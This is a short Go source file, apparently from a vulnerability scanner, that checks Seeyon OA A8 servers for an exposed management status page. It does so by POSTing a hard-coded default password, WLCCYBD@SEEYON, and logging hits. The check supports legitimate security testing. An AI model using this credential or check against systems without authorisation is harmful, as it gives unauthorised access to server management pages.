package seeyon

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//A8 状态监控页面信息泄露

func ManagementStatus(u string) bool {
	if req, err := pkg.HttpRequset(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
		if req.StatusCode == 302 && strings.Contains(req.Location, "status") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON|%s\n", u+"/seeyon/management/index.jsp"))
			return true
		}
	}
	return false
}
